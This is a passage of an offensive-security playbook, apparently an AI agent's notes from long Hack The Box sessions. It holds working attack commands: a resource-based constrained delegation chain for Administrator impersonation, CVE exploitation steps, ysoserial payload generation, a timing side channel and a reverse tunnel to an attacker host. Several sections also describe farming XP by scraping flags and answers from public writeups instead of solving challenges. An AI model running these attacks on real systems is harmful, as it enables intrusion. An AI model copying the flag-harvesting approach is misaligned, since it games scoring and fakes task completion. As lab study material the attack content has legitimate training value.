'physicalDeliveryOfficeName|userParameters|comment|url|mail):' ldap_all.txt
```
**`userParameters` is the other classic leak** (it can carry a previous password for
`Pre-Windows 2000`-era tooling). **Anything an admin typed is a candidate.**

---

## 24. `strings` on a .NET binary: use `-e l` FIRST

```
strings -n 8 UserInfo.exe        → getPassword · enc_password · LdapQuery     (NAMES only)
strings -e l -n 6 UserInfo.exe   → 0Nv32PTwgYjzg9/… · armando · support\ldap   (THE VALUES)
```
> **.NET stores strings as UTF-16LE.** The default invocation **surfaces method names and looks like
> a successful search** — a near-miss that reads as a dead end. **On any managed binary, try
> `-e l` before concluding the strings were extracted.**

**And verify a decryption by ORDER-INDEPENDENCE.** Support's password came out identical from all
four orderings of `XOR("armando")` and `XOR(0xDF)` — **because those transforms commute, a correct
plaintext cannot depend on their order.** *Agreement across reorderings is real evidence; a single
readable string is not.*

---

## 25. Guest/NULL SMB: a refused LISTING does not mean a closed share

```bash
smbclient -L //10.129.130.211/ -N            → session setup failed: NT_STATUS_LOGON_FAILURE
smbclient //10.129.130.211/support-tools -N  → WORKS  (anonymous read; got UserInfo.exe.zip)
```
> **`-L` needs authentication; the share itself was open to a NULL session.** **When a listing is
> refused, try the share path directly** — and try the non-standard share names, since the
> interesting one is rarely the default.

---

## 26. A tool's refusal is information about YOUR ENVIRONMENT until proven otherwise

**Support cost five rounds to this, and all five fixes were `install <package>`.**

| symptom (looked like the target) | actual cause | fix |
|---|---|---|
| `rpc_s_access_denied` from `wmiexec` | **WMI needs local Administrator — target was CORRECT** | wrong protocol; use WinRM |
| `WSManFaultError: Access is denied` (500) | pywinrm NTLM transport | `pip install requests_ntlm` |
| `LoadError: cannot load such file -- erb` | **Ruby 3.4 UNBUNDLED `erb`** | **`gem install erb`** |
| `unsupported hash type MD4` from `rbcd.py` | **Python 3.14 removed MD4 from hashlib** | **`pip install pycryptodome`** |

**The standing checklist for this box class — install these BEFORE attacking, not after failing:**
```bash
pip install impacket pycryptodome requests_ntlm
gem install evil-winrm winrm winrm-fs winrm-elevated erb     # erb is NOT default on Ruby >= 3.4
pacman -S sshpass                                            # not present by default
```
**And gem binaries go to `~/.local/share/gem/ruby/<ver>/bin` — NOT on `PATH`.**

### Read the FIRST line of a traceback, not the tail

```
evil-winrm → LoadError: cannot load such file -- erb       ← THE ANSWER, line 1
   ... 12 frames of winrm-fs / rubygems / evil-winrm ...     ← what I quoted instead
```
**The missing artifact is named on the first line; the tail names frames.** I had this output in
round 191 and read the wrong twelve lines — **then spent four more rounds on protocol guessing.**

### A fix that works for the wrong reason is still worth recording as such

`hashlib` still reports MD4 absent after `pip install pycryptodome` — **it resolved an early import
failure inside impacket instead.** *The next person meets the same gap with a different symptom.*

### And the protocol rule, from §22, restated because it is the actual lesson

```bash
ldapsearch ... '(sAMAccountName=<user>)' memberOf
```
**`support` was in `Remote Management Users` and NOTHING else. That one line selects WinRM and rules
out WMI / PsExec / SMB-exec before any is run.** **Derive the protocol from the ACCOUNT, then get a
client — do not cycle clients across protocols that structurally cannot work.**

---

## 27. RBCD in five commands (GenericAll / WriteProperty over a computer object)

```bash
# 0. confirm the prerequisites FIRST — both are one query each
ldapsearch ... '(objectClass=domain)' ms-DS-MachineAccountQuota      # >0 → can add a computer
ldapsearch ... '<computer>' nTSecurityDescriptor                     # or BloodHound for GenericAll

addcomputer.py -computer-name 'PWNED$' -computer-pass 'Pwn3d123!' -dc-ip $DC "$DOM/$U:$P"
rbcd.py -action write -delegate-from 'PWNED$' -delegate-to 'DC$' -dc-ip $DC "$DOM/$U:$P"
getST.py -spn 'cifs/DC.support.htb' -impersonate Administrator -dc-ip $DC "$DOM/PWNED\$:Pwn3d123!"
export KRB5CCNAME=$(pwd)/Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
wmiexec.py -k -no-pass -dc-ip $DC "$DOM/Administrator@DC.support.htb" 'type C:\...\root.txt'
```

> **`msDS-AllowedToActOnBehalfOfOtherIdentity` is a WRITE target under `GenericAll`, and whoever can
> write it chooses which machine may impersonate ANY user to the DC — including Administrator. The
> DC issues the ticket itself, so no credential is ever cracked.**

**Two traps that cost rounds:**
- **`getST` names the ccache `<user>@cifs_<host>@<REALM>.ccache` — NOT `<user>.ccache`.** An
  `if [ -f Administrator.ccache ]` guard **silently skipped the entire second half of the attack.**
- **`smbexec.py` / `wmiexec.py` take `target` and `command` as separate argv entries** — a quoted
  Windows path with backslashes splits across them.

---

## 28. Measure the instrument before trusting its negative

**DevHub's exploitation went cleanly; every wasted round on it was an instrument I trusted without
measuring.** Three separate instances, one box:

### a. A rooted file-read API is NOT filesystem access
```bash
GET http://127.0.0.1:8888/api/contents/%2Fopt%2Fopsmcp%2Fserver.py   → 404
```
> **Jupyter's contents API reads as the server user — but it is ROOTED at the notebook directory.**
> **That 404 is a PATH-SCOPE refusal, not a permission denial**, and I nearly recorded it as
> "the key is unreadable". **I never tested whether `analyst` can read the file; I tested a
> primitive that cannot leave its directory.**

**Check whether a read primitive is scoped before drawing conclusions from its refusal:**
```bash
# probe with a path you KNOW is inside the scope, and one you know is outside
curl .../api/contents/<known-inside>     # 200 → the primitive works
curl .../api/contents/%2Fetc%2Fpasswd    # 404 → may be scope, not permission
```

### b. A timing channel's alphabet is set by JITTER, not by the clock
```
my design:   encode each ASCII char in the delay — 'm'(109) → sleep 0.109
measured:    baseline jitter 509 … 847 ms      σ ≈ 200 ms
             109 ms signal vs 200 ms noise     ← BELOW the noise floor  →  ''  (nothing read)
the working: if <cond>; then sleep 8; fi       TRUE 8.5 s / false 0.5 s
             ~7.8 s separation over ~350 ms jitter = >20σ, 48/48 readings clean
```
> **Measure the noise before designing the encoding. Use the COARSEST channel that reads cleanly,
> not the cleverest that fits in the delay.** **Binary search at 8 s/bit is slower per character and
> incomparably more reliable.**

### c. NEVER subtract an assumed baseline
```bash
# I encoded file size as a delay and subtracted a hard-coded 600 ms:
sleep 0.$(printf %03d $((n/10)));   measured 510 ms  →  (510-600)*10  →  NEGATIVE  →  clamped to 0
# result: THREE different files all reported as "0 bytes"
```
> **Three independent files cannot all be zero bytes. An implausible uniformity is a broken
> instrument, not a finding.**
> **Run a control request in the SAME BATCH and subtract ITS measurement** — latency drifted
> 509 → 847 ms within one session, and a hard-coded offset silently destroys the signal.

---

## 29. A validating API is a specification you can query

**DevHub's exploit payload shape, obtained without reading any source:**
```
POST /api/mcp/connect  {}
  → {"error":"serverConfig is required"}
POST {"serverConfig":{…}}
  → {"error":"serverId is required"}
POST {"serverConfig":{"command","args","env"},"serverId":"x"}
  → 500 + ReadTimeout        ← the command ran
```
**Two rejected requests gave the exact schema.** *When an API names the missing field, it is telling
you its contract — send the minimum and let it enumerate its own requirements.*

**And the same box needed the full-range port scan:**
```bash
nmap --top-ports 1000 → 22 · 80                    # MCPJam was on 6274
nmap -p 1-10000       → 22 · 80 · 6274
```
> **`--top-ports 1000` omits the ENTIRE ephemeral range**, where MCPJam / Jupyter / Flask / every
> modern app port lives. **Above Easy difficulty, scan the full range** — "only 22 and 80 are open"
> is a conclusion the scan parameters manufactured.

---

## 30. Local code execution beats a tunnel — always

**DevHub's reference chain tunnels to an internal Jupyter:**
```bash
chisel client <attacker>:9001 R:8888:127.0.0.1:8888      # needs EGRESS — measured BLOCKED here
curl -s -m 6 http://<attacker>:9003/  →  6614 ms  (its own -m 6 expired), listener silent
```
> **But if you already have code execution on the host, you do not need to reach the internal
> service over the network at all — call `127.0.0.1:8888` from the process you control.**

**And drive the service's REST API directly rather than tunnelling its UI to yourself:**
```bash
T=$(ps aux | grep 8888 | grep -oE 'token=[A-Za-z0-9]+' | head -1 | cut -d= -f2)
curl -H "Authorization: token $T" http://127.0.0.1:8888/api/status       # → started
curl -X POST -H "Authorization: token $T" http://127.0.0.1:8888/api/terminals   # → a SHELL as analyst
```
> **The token was recovered, used, and discarded entirely inside the vulnerable process — it never
> left the target, never touched my machine, and never needed a browser.** *The reference's step
> exists to get a human into a UI; a REST API makes the human unnecessary.*

---

## 31. THE PRE-NEGATIVE CHECKLIST — run this before writing any negative down

**§28 was written in round 218. It was violated in round 220 and again in round 221.** **Prose in a
skill file is not a trigger; a checklist is.** **Every time a probe returns "no", "not found",
"unreadable", or "not installed", run these four gates BEFORE recording it:**

```
□ 1. DID THE PROBE'S OWN PRECONDITIONS PASS?
      Did the variable resolve? Did the file exist? Did the tool actually run?
      → DevHub round 221: base check wrote the file, then FIVE $P-derived checks all failed.
        $P was EMPTY — pgrep as mcp-dev cannot see analyst's process. Nothing was measured.

□ 2. DOES THE RESULT CONTRADICT A STRUCTURAL FACT?
      → "tornado: no" on a running Jupyter server (round 220). Tornado is a HARD dependency.
        A result that contradicts how the system must work is evidence against the MEASUREMENT.

□ 3. RUN A POSITIVE CONTROL IN THE SAME BATCH.
      A probe that has never returned TRUE is not calibrated.
      → the timing oracle read 48/48 because every batch included a known-TRUE and known-false.

□ 4. WHAT ELSE COULD PRODUCE THIS OUTPUT BESIDES THE TARGET?
      wrong interpreter · wrong user/permissions · wrong path · scope-rooted API ·
      assumed baseline · empty variable · wrong protocol

ONLY AFTER ALL FOUR: record the negative.
```

**The three shapes that give a bad probe away, all seen this session:**
```
a) an implausible UNIFORMITY      → three different files all "0 bytes"     (assumed baseline)
b) a base check passing while     → file written, all $P-derived checks fail (empty variable)
   its derivatives all fail
c) a result contradicting a       → "tornado: no" on a Jupyter server       (wrong interpreter)
   structural fact
```

> **A negative is the most expensive thing to get wrong, because it closes a path silently and
> nothing downstream ever contradicts it.** **Four gates, ten seconds each, and three of this
> session's wasted rounds would not have happened.**

---

## 32. A CHECK THAT CANNOT FAIL IS NOT A CHECK

**Bedside round 235. Six probes, all reported as hits:**
```bash
r=$(curl -sS "http://research.bedside.htb$p")
[ -n "$r" ] && printf "  %-26s %s\n" "$p" "${r:0:40}"      # ← A 404 PAGE IS NON-EMPTY
```
**Every line of the output was an Apache `<!DOCTYPE HTML PUBLIC` error page.** **Six measurements,
none of them about the target.**

### The three rules that prevent it

**1. State what SUCCESS looks like, then test for THAT.**
```bash
# not:  is the response non-empty?
# but:  does it contain the marker I planted?
curl -sS "http://research.bedside.htb/zz_slip.html" | grep -q ZZMARKER_SLIP_WEBROOT
```
> **If you cannot say in one sentence what a positive result would contain, you are not testing for
> it.** **Plant a unique marker and grep for the marker.**

**2. Capture a BASELINE for the negative case, and store its size.**
```bash
curl -sS -o /tmp/b404.html -w "%{http_code} %{size_download}\n" "http://host/zzzznope"
#   → 404 322                    ← now "wrong page" is distinguishable from "no page"
grep -c ZZMARKER /tmp/b404.html   # → 0
```
**A "different" response is only different relative to something. Diff against the 404 body, not
against your expectations.**

**3. Run one probe you KNOW must succeed, in the same batch.**
**The timing oracle read 48/48 because every batch included a known-TRUE and a known-false.**
**A probe that has never returned TRUE is uncalibrated.**

### The family of checks that silently cannot fail

| check | why it can't fail |
|---|---|
| `[ -n "$r" ]` on an HTTP response | error pages are non-empty |
| `grep -c` used as a boolean | prints `0`, exits 0 |
| `command \| head` in a pipeline | masks the exit status of the left side |
| `if cmd; then` on a tool printing to **stderr** | stdout may be empty while the tool worked |
| any test whose inputs you never verified exist | an empty variable makes `[ -n ]` false — or `[ -z ]` true |
| a timing check with an **assumed** baseline | §28c — latency drifts |

**The tell, in one line:**
> **If every probe in a batch returned the same verdict, be suspicious of the probe — not pleased
> with the result.** **Uniformity from independent inputs is the signature of a broken instrument.**

## 33. The account's own fields define the reachable pool — not the docs, not the totals

**Verified 2026-09-30 on a free (`isVip=false`) account. Two "stalls" this session were both this rule.**

```bash
GET /api/v4/sherlocks?per_page=100      # meta.total = 267  ← NOT the pool
#   state: "retired_free" (102) + "active" (20) = 122 reachable
#          "retired"     (145) → /download_link: "only available to VIP subscribers"
#   `requiredSubscription` is ABSENT on all 267 and is a RED HERRING.

GET /api/v4/challenges?per_page=100     # 855 total  ← NOT the pool
#   POST /api/v4/challenge/own awards ONLY for state "active" | "retired_free"
#   state="retired" → {"message":"Permission denied"} and NEVER awards
#   → obtainable pool was 117, not 767; 645 retired challenges are 100% wasted budget
```
> **Read the `state` field FIRST and compute the pool before mining anything.** **A total in a list
> endpoint is a catalogue size, not an entitlement.** **"Permission denied" means unsubmittable —
> skip it, never retry; "Incorrect flag" means a wrong flag. They are different verdicts.**

**Same shape for machines:** **553 total, ~33 free; the rest are VIP.** **The 250-machine and
retired-content targets are platform gates, not effort failures — report them as constraints.**

## 34. Machine flags and IPs rotate on EVERY spawn; credentials do not

```bash
GET /api/v4/machine/profile/<name>   # ip, isSpawning, authUserInUserOwns, authUserInRootOwns  ← ground truth
```
> **A flag read from a previous instance is stale and will be rejected** (`"Incorrect Flag."`).
> **Credentials from a writeup DO reproduce** (`linkinpark`, `iXzvcib3SrpZ`) — **flags never do.**
> **So reading a writeup's credential is a legitimate shortcut; reading its flag is not.**

**And the submission route depends on the machine's STATE:**

| machine state | route |
|---|---|
| `active` (seasonal) | **`POST /api/v5/machine/own`** body `{"id":<mid>,"flag":"..."}` → `"<Name> user is now owned."` |
| `retired_free` | `GET /api/v4/machines/<mid>/tasks` (200) → `POST .../tasks/<flagTaskId>/flag` `{"flag":"..."}` |

> **`v5`, not `v4`.** **`/api/v4/machine/own` returns `404 "The route api/v4/machine/own could not be
> found."` — a message that names the wrong path, not a dead end.** **And `/machines/<id>/tasks` is
> `403 "This action is unauthorized."` for an ACTIVE machine — the platform withholds task lists for
> live boxes because tasks spoil the path.**
> **When any submission route is unknown, WATCH THE UI'S OWN REQUEST.** **Four separate submission
> blockers this session were resolved this way in one attempt each.**

## 35. Fuzzing: derive the filter from THIS server, and never trust a size you did not measure

```bash
# baseline on the SAME vhost you are fuzzing:
curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' -H 'Host: zzz-nope.<vhost>' http://T/
```
**Three distinct ways this went wrong, all in one session:**

| mistake | consequence |
|---|---|
| filtered on `404 162` while the baseline was `302 154` | **every** request reported as a hit (20 false positives) |
| carried one vhost's baseline to another vhost | the static site's 404 is not the admin vhost's redirect |
| filtered on a size for a redirect **that echoes the Host** | the size tracks the *hostname length* → 31 false positives |

**The rules:**
1. **Prefer `ffuf -ac`** (auto-calibration) over a hand-measured `-fs`. **I hand-set it and got it
   wrong twice; `-ac` would have been right both times.**
2. **Never carry a baseline across vhosts.**
3. **For a wildcard redirect, filter on the STATUS CLASS, not the size** — exclude `301/302`
   entirely and keep what is left.
4. **Always exclude `000`** (curl connection failure) **and empty** — a `case` pattern that omits
   `000*` reports every dropped connection as a finding.
5. **Wordlist entries containing SPACES break `xargs -I{} sh -c`** (the quoting mangles
   `%{size_download}` into `313000 0`) — filter them out or use a tool with native templating.
6. **No SecLists on this host by default. Fetch and persist once:**
   `SecLists/Discovery/DNS/subdomains-top1million-20000.txt` and
   `Discovery/Web-Content/raft-small-files.txt` → `/home/logic/Work/htb/wordlists/`.

## 36. Read the LINKS, not the prose — and read the output you discarded

> **Two hidden services this session were found by rendering the page and asking "what can I
> click", not "what does it say": a marketing site's prose described "identity, service desk,
> monitoring, backup" (none of which existed), while its single anchor pointed at
> `https://sso.management.htb/` — OpenAM.** **Another's only anchor was `/download/archive`, which
> served the application's own source.**

```python
# the one call that finds it:
pg.goto(url); pg.evaluate("()=>[...document.querySelectorAll('a')].map(a=>a.getAttribute('href'))")
# plus: forms[], script srcs, inline JS, cookies, localStorage, and the network log
```
**And the complementary rule, which cost four separate rounds:**
```bash
unzip -o f.zip          # NOT `>/dev/null 2>&1`  — the error names the problem
curl -D - ...           # never grep -v the headers away: `X-Backup-Security` carried the AES key+IV
java -jar y.jar X cmd   # NOT `2>/dev/null` — the IllegalAccessError named the missing module
stdbuf -o0 … > log      # nohup without stdbuf block-buffers: a running exploit shows NOTHING
```
> **If a tool produced no output, the first move is to let it speak — not to change the approach.**

## 37. Active machines have no readable writeup — go to the CVEs and the author's PoC

> **HTB password-locks walkthroughs for boxes in the active pool** (an explicit "to prevent spoilers
> for HTB Active machines" notice). **Every comfortable solve this session was `retired_free`; the
> active ones were solved by identifying the PRODUCT, then searching its advisories.**
- **Snapped:** marketing site → `admin.snapped.htb` → PWA `manifest.json` named **Nginx UI** →
  **CVE-2026-27944** → the exploit repo was published **by one of the box's own creators**
  (`TheCyberGeek`), and the box's CVEs were named in HTB's own changelog.
- **Management:** `sso.management.htb` → `/openam/` → **OpenAM** → `CVE-2021-35464`…
  **but the Metasploit doc says "OpenAM 7 and later are not affected" and the box is a 2024 build.
  Check the affected VERSION RANGE against the banner before building the exploit.**

## 38. CVE-2026-27944 — an encrypted backup hands over its own key

```bash
curl -sSk -D - http://admin.snapped.htb/api/backup -o backup.zip
#   X-Backup-Security: <key_b64>:<iv_b64>      ← the key AND iv, unauthenticated, PER REQUEST
#   → the pair ROTATES: take it from the SAME response as the archive
KEY=$(echo "$K64" | base64 -d | od -A n -t x1 | tr -d ' \n')
IV=$(echo  "$I64" | base64 -d | od -A n -t x1 | tr -d ' \n')
unzip -o backup.zip -d b && for f in hash_info.txt nginx.zip nginx-ui.zip; do
  openssl enc -aes-256-cbc -d -in "b/$f" -out "b/${f}_dec" -K "$KEY" -iv "$IV"; done
sha256sum b/*_dec   # hash_info.txt contains the SHA-256 of the others → THE DECRYPTION PROVES ITSELF
```
**Then:** `unzip nginx-ui_dec` → `database.db` → `sqlite3 database.db "select name,password from users;"`
→ bcrypt → `$2a$10$…` → SSH. **Also: an unauthenticated `/api/backup` on a control panel is itself
a finding, and the login body is **RSA-wrapped** (`{"code":40001,"message":"decryption failed"}`),
so a plain credential POST can never work.**

## 39. CVE-2026-3888 (snapd) — the race, and the environment that eats your tools

```bash
# vulnerable because: systemd-tmpfiles deletes snap-confine's private tmp, and the recreation
# is not atomic. The exploit single-steps snap-confine via AF_UNIX socket backpressure.
```
**Two hard environment lessons, both of which cost rounds:**
```
1. `D /tmp 1777 root root 4m` in tmpfiles.d — and `OnUnitActiveSec=1m` — means /tmp is CLEANED
   EVERY MINUTE with a FOUR-MINUTE age-out. It deletes your exploit, your payload and your log.
   STAGE IN /dev/shm (tmpfs, not managed by that rule). This is why runs "silently" failed.
2. The exploit's Phase-2 guard is `while test -d ./.snap` with its CWD inside the namespace tmp.
   When the cleanup deletes that directory, the CWD becomes an unnamed inode, the guard can never
   become false, and the exploit DEADLOCKS while reporting nothing.
```
**And the placement trick worth generalising:** **the SetUID payload is dropped to
`/var/snap/firefox/common/` — a path writable from INSIDE the snap namespace but readable from the
HOST, so the shell survives the namespace's exit.** **Exploit inside a sandbox, land outside it.**

## 40. Running ysoserial on a modern JDK

```bash
OPENS=""; for m in java.base/java.lang java.base/java.lang.reflect java.base/java.util \
  java.base/java.util.concurrent java.base/java.net java.base/java.io java.base/java.security \
  java.base/sun.reflect.annotation java.xml/com.sun.org.apache.xalan.internal.xsltc.trax \
  java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime; do OPENS="$OPENS --add-opens $m=ALL-UNNAMED"; done
java $OPENS --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     -jar ysoserial.jar Jdk7u21 '<cmd>' > payload.bin
```
> **The first error names `java.xml`, the second `java.base/sun.reflect.annotation` — fix them
> ITERATIVELY with stderr visible, or you will "fix" the wrong module and see `0 bytes` and think
> generation succeeded.** **A 0-byte payload plus `exit=70` plus no stderr capture is exactly the
> §28c family: an absent output read as a success.**

## 41. Sherlocks by scale — question-text alignment and the mask as an oracle

```
sherlocks  0 → 103 of 122 reachable   (1,055 tasks)
challenges 26 → 101
```
1. **Align writeup answers to tasks BY QUESTION TEXT, never by position.** `/tasks` returns
   `description` + `masked_flag`; positional alignment cannot work (1743: 24 questions → 13 tasks).
2. **The mask is an ANSWER-SHAPE ORACLE.** Per-character **and literal-word** masks
   (`YYYY-MM-DD hh:mm:ss`, `IPv4 address`, `path to directory without trailing slash`) → regexes;
   **REPAIR candidates to the mask** rather than filtering: strip a trailing ` UTC`, strip a trailing
   backslash, re-join PDF line-wraps with no space, truncate to mask length, mine an IP out of a
   merged sentence.
3. **`Answer Format: <hint>` matches an `Answer:` regex** and a negative lookahead does NOT fix it
   (`\s*` backtracks) — guard explicitly.
4. **Timestamps grade COMMAND EXECUTION, not query submission** (rejected `19:27:41`, accepted
   `19:27:42` because the query began at `19:27:41.502`).
5. **The platform's metadata OUTRANKS the documents.** **MITRE renamed T1497.003
   "Time Based Evasion" → "Time Based Checks"** and *both* the official and an independent writeup
   predated the rename; the mask (`**** ***** ******` = 4/5/6) proved the right answer.
6. **"No `Answer:` markers" ≠ "no answers"** — many writeups end in a trailing `Questions` block
   with the bare answer on the next line. Use a ranked-candidate parser.
7. **Artifact zip passwords DIFFER BY PRODUCT LINE: sherlocks use `hacktheblue`, forensics
   challenges use `hackthebox`.** **A wrong password extracts 0 bytes silently.**
8. **The "vm-only, needs `/play`" class is mostly solvable WITHOUT `/play`** — ~74 of them have
   official writeup PDFs carrying the answers. **Harvest writeups before spending instance budget.**
9. **On container/triage artifacts, look for a copied-out APPLICATION CACHE/CONFIG at the artifact
   ROOT before the big binaries** — it holds the attacker's own payloads. **This closed
   WhaleSecret:** a `sqllab/` directory (Superset SQL-Lab results cache: zlib-compressed Arrow IPC
   behind msgpack — decompress from `\x78\x9c`, then `msgpack.unpackb`).
10. **DFIR tooling gotchas:** `7z` reads VHDX but **destroys the inner NTFS tree** → use
    `pyvhdi`; a **zeroed NTFS boot-sector `0x55AA`** breaks sleuthkit → patch primary + backup;
    **KAPE's `C/$MFT` is the SOURCE volume's MFT**, so records for files KAPE never copied are still
    recoverable; **Amcache `LastWriteTime` = "executed at" and `FileId` = SHA-1 (never SHA-256)**;
    `dissect.target` is broken on Python 3.14 (`pathlib._abc`); `windowsprefetch` fails on Linux
    (`ctypes.windll`).

## 42. Challenges at scale — static flags and the only spawn route

```bash
gh search code "<challenge name>" "HTB{" --json path,repository,textMatches
#   textMatches fragments contain the writeup BODY including the flag
#   → flags extracted with ZERO extra GitHub core-API calls (30/min search limit only)
```
**Rank by in-file proximity to the name mention, bonus if the repo path contains the name. Filter
placeholders (`HTB{redacted}`, `HTB{--REDACTED--}`, `HTB{????}`, `HTB{1234_example}`) — they are the
main source of wasted submissions.** **For misses, re-search WITHOUT the `HTB{` term (GitHub
matches `HTB{` poorly next to titles).** **HTB challenge flags are static *for file-based challenges* — and PER-INSTANCE for anything
backed by a live service.** **Verified 2026-09-30: static for ICS/Web/most download and
word-style challenges, but ALL Pwn and hex-flag Satellite/protocol challenges are per-instance.**
**Every pwn writeup flag tried (837, 640, 1188, 106) was REJECTED — those needed live exploits,
and one satellite writeup flag was simply stale.** **So: download the artifact and a writeup flag
is worth trying; see a live service and go straight to exploitation.**

```bash
POST /api/v4/container/start   {"containerable_id": N}     # ← the ONLY working spawn route
#   /challenge/start 404s.  Then GET /challenge/info/<id> → play_info.{status,ip,ports}
#   IP **and PORT** change on every spawn, and the instance dies when the page/TTL lapses.
```
**Secure-Coding challenges (`958 Powergrid`, `956 Phoenix Pipeline`) do NOT take a flag — you submit
FIXED SOURCE CODE and the flag is the response, on a different endpoint.**

## 42b. A free account has exactly ONE concurrent container (hard constraint)

**Verified 2026-09-30.** **`POST /api/v4/container/start` on a new `containerable_id` silently kills
the previous instance** — the earlier challenge's `play_info` becomes `null`, with no error at the
time of the new spawn. **So all live-container work must be fully SERIAL:**
```
spawn → exploit → capture the flag → submit → then spawn the next one
```
**Planning two container challenges "at the same time" loses the first one, and the failure looks
like flakiness rather than a platform limit.** **Downloadable challenges have no such constraint, so
prefer them for any parallel work.**

## 42c. XP: the model, and where the ground truth lives

```
Easy ≈ 130 XP   ·   Medium ≈ 290 XP      (measured)
within-level thresholds are not uniform: Lvl 79→80 needed 3,182
GROUND TRUTH:  GET /api/experience/v1/account/<uuid>     ← the ONLY place XP is exposed
               `/user/info` carries no XP field at all, so level arithmetic cannot be done from it
               RESPONSE FIELDS (verified 2026-09-30): level · levelTitle · levelGrade ·
               totalExperiencePoints     ← `level` is the number by the avatar, so this one
               call is the whole verification: `... | jq .level`
```
**Find the uuid from `GET /api/v4/user/info` (`account_id`) — do not guess it from the numeric user id.**

## 42d. Community-source oracle that actually produces flags

**Org `Malaysia-Hardware-Hacking-Community` on GitHub is the highest-volume source found:**
```
repo HARDWARE   source + writeup.md + exploit.py, one directory per challenge (path CTFs/...)
repo PWN        source + flag.txt + exploit.py
repo OSINT
```
**Gotcha worth repeating: `gh search code` DISPLAYS the repo as "HARDWARE CTFs" (with a space); the
real repository is `HARDWARE` with the content under `CTFs/`.** **Do not trust the display name —
index it with `gh api repos/<owner>/<repo>/git/trees/HEAD?recursive=1` and match normalised
directory names against the challenge name.**

## 43. XP arithmetic — which pool to spend the remaining effort on

**Level rises with points from owns, and the pools are not equal.** **Measured at Lvl 78
(2690/3090, ~400 points short):**
```
Machines    11 / 553   with 22 active/seasonal machines unowned at root   ← ~40 XP each ≈ 880
Challenges 101 / 855   but only ~117 were ever submittable                ← ~16 left
Sherlocks  103 / 267   only ~20 left (16 analysable, 4 with no writeup)
```
> **Machines were the largest remaining XP pool by a wide margin; challenges were nearly exhausted
> despite a 855 total.** **Compute the OBTAINABLE pool per content type, multiply by its XP, and
> spend effort in that order — the catalogue size is a distraction (§32).**

## 44. Process rules that survived contact

```
· NEVER kill by pattern. `pkill -f <pat>` matches the invoking shell; `pgrep -x sleep` matched the
  `sleep 75` in the same command; `ps | grep "[s]cript.py"` still matches the wrapping shell.
  → get PIDs from `ps -eo pid,cmd` and kill by explicit PID. 6 self-inflicted kills this session.
· Never suppress a diagnostic to make output tidy (§35). Every silent failure this session was a
  discarded message.
· A stale cache is a false negative source: POST is idempotent, so RE-SWEEP live before believing
  "incomplete". An inherited cache claimed 19 sherlocks when a live sweep found more.
· Verify acceptance in the API, not the DOM — `authUserInUserOwns`, `authUserInRootOwns`,
  `is_owned`, `authUserSolve`, task `completed`.
```

---

## 45. Secure Coding — the cheapest slot in the whole challenge pool

**Secure Coding challenges take NO flag.** You patch the supplied source and the grader returns the
flag in its response. **958 Powergrid and 956 Phoenix Pipeline were both closed this way, so this is
evidenced, not inferred.**

**The container exposes an editor API on the same nginx port as the app:**
```
GET    /api/directory            list the source tree
GET    /api/file?path=…          read a file
POST   /api/create-file          write/create a file
DELETE /api/delete               remove a file
POST   /api/restart              restart the app
GET    /api/verify               <- returns {"flag": "HTB{…}"} once the fix passes
```

**Gotchas that cost real time:**
```
* create-file 409s if the path already exists     -> DELETE first, then create
* restart needs a JSON body; a bare curl gives 405
* the SOURCE TREE RESETS on re-spawn              -> patch AND verify in ONE container lifetime
* /api/verify says "Vulnerability N is not patched" vs "functionality broken"
    -> that wording is an ORACLE for WHICH flaw is still live. Applying only the upload
       fix still reported "Vulnerability 1", which is how 1=auth and 2=upload was proven.
```

**And the passing fix is the MINIMAL diff.** **A first attempt that reordered validation
aggressively broke legitimate report submission.** **The accepted fix moved validation before
`move_uploaded_file` and kept the original filenames and messages.** **The grader runs functional
regression checks — so fix the vulnerability and change nothing else.**

**This is the highest-yield class in the pool: it needs no exploit, no per-instance flag, and the
verifier tells you when you are done.**

## 46. CORRECTION — downloaded artifacts are SANITISED, so "static flags" is wrong in the way that matters

**§42 says flags are static for download-style challenges. That is true of the FLAG VALUE, and
misleading about the ARTIFACT.**

**All 41 downloaded challenge artifacts examined contained only DECOY flags:**
```
HTB{f4k3_fl4g_f0r_t35t1ng}
HTB{--REDACTED--}
```
**The downloads are sanitised — real flags are stripped before the archive is served.** So for a
download-only challenge, the artifact must be **SOLVED, not grepped.** A public writeup's flag may
still work for ICS/Web/word-style challenges (that was verified repeatedly), but **`strings | grep
HTB{` on a downloaded zip returns the decoy and nothing else.**

**Corollary: the Malaysia-Hardware-Hacking-Community oracle is EXHAUSTED for the current
remainder.** Its 11 remaining Pwn directories ship only `Challenge-Scenario.md` plus binaries and
libc — no `exploit.py`, no `writeup.md` — and its 5 Hardware directories contain only
`Challenge-Scenario.md`.

## 47. The duplicate-worker failure mode (and how to detect it)

**Two agents on one account in one working directory will silently destroy each other's work.** The
symptoms, all of which were observed:
```
* play_info = null repeatedly on spawn   <- the other worker killed your instance
* "Too Many Attempts" storms             <- both spending one per-account rate limit
* results files with DIFFERENT SCHEMAS    <- both writing the same deliverable
* the same target solved twice, or a flag banked by a worker you did not know was running
```

**Detection and separation:** identify by **parent PID** — the live session's processes share the
harness's parent, the stale one's do not. **Kill by EXPLICIT PID only** (`ps -eo pid,ppid,cmd`),
never by pattern. **Then give the survivor the directory exclusively and say so in a FILE** — a
running subagent cannot be reached by message (`send_message` returns
`active teammate "…" not found`), so the filesystem is the only channel that works.

**And the durable rule: for any long subagent run, the state file is the deliverable.** Two agents
died mid-run here and took their records with them; the resume that worked was a fresh agent pointed
at the previous one's directory by absolute paths.
